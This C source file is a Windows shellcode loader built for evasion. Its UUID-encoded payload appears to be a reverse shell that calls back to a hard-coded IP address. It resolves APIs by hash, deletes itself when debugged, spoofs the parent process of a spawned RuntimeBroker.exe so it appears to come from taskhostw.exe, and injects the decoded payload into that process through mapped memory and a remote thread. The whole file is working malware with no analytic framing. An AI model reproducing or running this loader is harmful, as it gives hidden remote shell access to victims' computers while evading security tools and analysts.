#include<Windows.h>
#include<stdio.h>
#include<winternl.h>
#include "debugged.h"
#include "getpid.h"
#include "hash.h"
#include "custom.h"

#pragma warning(disable:4996)
#pragma comment(lib,"OneCore.lib")

const char* UuidArray[] = {
	"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
	"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
	"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
	"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
	"8B485A59-E912-FF57-FFFF-5D49BE777332", "0032335F-4100-4956-89E6-4881ECA00100", "E5894900-BC49-0002-2329-C0A860834154",
	"4CE48949-F189-BA41-4C77-2607FFD54C89", "010168EA-0000-4159-BA29-806B00FFD550", "C9314D50-314D-48C0-FFC0-4889C248FFC0",
	"41C18948-EABA-DF0F-E0FF-D54889C76A10", "894C5841-48E2-F989-41BA-99A57461FFD5", "40C48148-0002-4900-B863-6D6400000000",
	"41504100-4850-E289-5757-574D31C06A0D", "E2504159-66FC-44C7-2454-0101488D4424", "6800C618-8948-56E6-5041-504150415049",
	"5041C0FF-FF49-4DC8-89C1-4C89C141BA79", "FF863FCC-48D5-D231-48FF-CA8B0E41BA08", "FF601D87-BBD5-B5F0-A256-41BAA695BD9D",
	"8348D5FF-28C4-063C-7C0A-80FBE07505BB", "6F721347-006A-4159-89DA-FFD590909090"
};

#define NumberOfElements 29

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
	);

BOOL UuidDeobfuscation(IN const CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	PCSTR		Terminator = NULL;

	NTSTATUS	STATUS = NULL;

	CTHASHA(LoadLibraryW);
	fnloadlibraryw ploadlibraryw = (fnloadlibraryw)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), LoadLibraryWDjb2A);
	// getting UuidFromStringA   address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)getprocaddresscustom(ploadlibraryw(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// getting the real size of the shellcode (number of elements * 16 => original shellcode size)
	sBuffSize = NmbrOfElements * 16;
	// allocating mem, that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;


	// loop through all the addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {
		// UuidArray[i] is a single UUid address from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if failed ...
			printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
			return FALSE;
		}

		// tmp buffer will be used to point to where to write next (in the newly allocated memory)
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

BOOL selfdeletion()
{
	WCHAR path[MAX_PATH];
	FILE_DISPOSITION_INFO deletefile = { 0 };
	HANDLE hfile = NULL;
	PFILE_RENAME_INFO prename = NULL;
	const WCHAR* newname = L":SHADE\0";
	SIZE_T snewname = sizeof(WCHAR) * wcslen(newname);

	RtlSecureZeroMemory(&deletefile, sizeof(FILE_DISPOSITION_INFO));

	CTHASHA(GetModuleFileNameW);
	fngetmodulefilenamew pgetmodulefilenamew = (fngetmodulefilenamew)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), GetModuleFileNameWDjb2A);
	if (pgetmodulefilenamew(NULL, path, MAX_PATH * 2) == 0)
	{
		printf("GetModuleFileNameW failed with error: %d\n", GetLastError());
		return FALSE;
	}

	CTHASHA(CreateFileW);
	fncreatefilew pcreatefilew = (fncreatefilew)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), CreateFileWDjb2A);

	hfile = pcreatefilew(path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW failed with error: %d\n", GetLastError());
		return FALSE;
	}

	prename =(PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_RENAME_INFO) + snewname);
	if (prename == NULL)
	{
		printf("HeapAlloc failed with error: %d\n", GetLastError());
		return FALSE;
	}

	prename->FileNameLength = snewname;
	RtlCopyMemory(prename->FileName, newname, snewname);

	CTHASHA(SetFileInformationByHandle);
	fnsetfileinformationbyhandle psetfileinformationbyhandle = (fnsetfileinformationbyhandle)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), SetFileInformationByHandleDjb2A);

	if (!psetfileinformationbyhandle(hfile, FileRenameInfo, prename, sizeof(FILE_RENAME_INFO) + snewname))
	{
		printf("SetFileInformationByHandle failed with error: %d\n", GetLastError());
		return FALSE;
	}

	CloseHandle(hfile);

	hfile = pcreatefilew(path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW failed with error: %d\n", GetLastError());
		return FALSE;
	}

	deletefile.DeleteFileW = TRUE;

	if (!psetfileinformationbyhandle(hfile, FileDispositionInfo, &deletefile, sizeof(deletefile)))
	{
		printf("SetFileInformationByHandle failed with error: %d\n", GetLastError());
		return FALSE;
	}

	CloseHandle(hfile);

	return TRUE;
}

BOOL createspoofedpid(HANDLE hparentprocess, LPCSTR childname, DWORD* dwpid, HANDLE* hnewprocess, HANDLE* hthread)
{
	STARTUPINFOEXA siexa = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&siexa, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	siexa.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	char windir[MAX_PATH]; 
	char path[MAX_PATH];
	char currentdir[MAX_PATH];

	if (!GetEnvironmentVariableA("WINDIR", windir, MAX_PATH))
	{
		printf("GetEnvironmentVariableA failed with error: %d\n", GetLastError());
		return FALSE;
	}

	sprintf(path, "%s\\System32\\%s", windir, childname);
	sprintf(currentdir, "%s\\System32\\", windir);

	PPROC_THREAD_ATTRIBUTE_LIST pthreadattlist = NULL;
	SIZE_T sthreadattlist = NULL;

	CTHASHA(InitializeProcThreadAttributeList);
	fninitializeprocthreadattributelist pinitializaprocthreadattributelist = (fninitializeprocthreadattributelist)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), InitializeProcThreadAttributeListDjb2A);
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sthreadattlist);

	pthreadattlist = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sthreadattlist);
	if (pthreadattlist == NULL)
	{
		printf("HeapAlloc failed with error: %d\n", GetLastError());
		return FALSE;
	}

	if (!InitializeProcThreadAttributeList(pthreadattlist, 1, NULL, &sthreadattlist))
	{
		printf("InitializeProcThreadAttributeList failed with error: %d\n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pthreadattlist, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hparentprocess, sizeof(HANDLE), NULL, NULL))
	{
		printf("UpdateProcThreadAttribute failed with error: %d\n", GetLastError());
		return FALSE;
	}

	siexa.lpAttributeList = pthreadattlist;

	CTHASHA(CreateProcessA);
	fncreateprocessa pcreateprocessa = (fncreateprocessa)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), CreateProcessADjb2A);
	if (!pcreateprocessa(NULL, path, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, currentdir, &siexa.StartupInfo, &pi))
	{
		printf("CreateProcessA failed with error: %d\n", GetLastError());
		return FALSE;
	}

	*dwpid = pi.dwProcessId;
	*hnewprocess = pi.hProcess;
	*hthread = pi.hThread;
	return TRUE;
}

BOOL remotemapinjection(HANDLE hprocess, PBYTE payload, SIZE_T payloadsize, PVOID* paddress)
{
	HANDLE hfile = NULL;

	CTHASHA(CreateFileMappingW);
	fncreatefilemappingw pcreatefilemappingw = (fncreatefilemappingw)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), CreateFileMappingWDjb2A);
	hfile = pcreatefilemappingw(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, (DWORD)payloadsize, NULL);
	if (hfile == NULL)
	{
		printf("CreateFileMappingW failed with error: %d\n", GetLastError());
		return FALSE;
	}

	PVOID plocalmapaddress = NULL;

	CTHASHA(MapViewOfFile);
	fnmapviewoffile pmapviewoffile = (fnmapviewoffile)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"),MapViewOfFileDjb2A);

	plocalmapaddress = pmapviewoffile(hfile, FILE_MAP_WRITE, NULL, NULL, payloadsize);
	if (plocalmapaddress == NULL)
	{
		printf("MapViewofFile failed with error: %d\n", GetLastError());
		return FALSE;
	}
	memcpy(plocalmapaddress, payload, payloadsize);

	PVOID premotemapaddress = NULL;

	CTHASHA(MapViewOfFileNuma2);
	fnmapviewoffilenuma2 pmapviewoffilenuma2 = (fnmapviewoffilenuma2)getprocaddresscustomh(getmodulehandlecustom(L"Api-ms-win-core-memory-l1-1-5.dll"), MapViewOfFileNuma2Djb2A);

	premotemapaddress = MapViewOfFileNuma2(hfile, hprocess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READ, NUMA_NO_PREFERRED_NODE);
	if (premotemapaddress == NULL)
	{
		printf("MapViewOfFile2 failed with errror: %d\n", GetLastError());
		return FALSE;
	}
	printf("Remote address is: 0x%p\n", premotemapaddress);
	*paddress = premotemapaddress;
	return TRUE;
}

int main()
{
	CTHASHA(CreateMutexA);
	fncreatemutexa pcreatemutexa = (fncreatemutexa)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), CreateMutexADjb2A);
	HANDLE hmutex = pcreatemutexa(NULL, FALSE, "ControlMutex");
	if (hmutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		printf("Program already running");
		return 0;
	}

	if (debugged())
	{
		if (selfdeletion())
		{
			printf("Being debugged, self-deleting");
			return 0;
		}
		else {
			printf("Self deletion failed");
			return -1;
		}
	}

	DWORD pid = NULL;
	HANDLE hprocess = NULL;
	if (!getpid(L"taskhostw.exe", &pid, &hprocess))
	{
		printf("getpid failed");
		return -1;
	}
	printf("PID: %d\n", pid);

	DWORD dwchildpid = NULL;
	HANDLE hnewprocess = NULL;
	HANDLE hthread = NULL;
	if (!createspoofedpid(hprocess, "RuntimeBroker.exe -Embedding", &dwchildpid, &hnewprocess, &hthread))
	{
		printf("Failed to create a spoofed process");
		return -1;
	}
	printf("Target process created with pid: %d\n", dwchildpid);

	PBYTE pdepayload = NULL;
	SIZE_T sdepayloadsize = NULL;

	if (!(UuidDeobfuscation(UuidArray, NumberOfElements, &pdepayload, &sdepayloadsize)))
	{
		printf("Decryption failed");
		return -1;
	}
	printf("Payload successfully decrypted and present at 0x%p of size: %d\n", pdepayload, sdepayloadsize);

	PVOID paddress = NULL;
	if (!remotemapinjection(hnewprocess, pdepayload, sdepayloadsize, &paddress))
	{
		printf("Remotemapinjection failed");
		return -1;
	}

	CTHASHA(CreateRemoteThread);
	fncreateremotethread pcreateremotethread = (fncreateremotethread)getprocaddresscustomh(getmodulehandlecustom(L"KERNEL32.DLL"), CreateRemoteThreadDjb2A);
	pcreateremotethread(hnewprocess, NULL, NULL,(LPTHREAD_START_ROUTINE) paddress, NULL, NULL, NULL);

	getchar();

	return 0;
}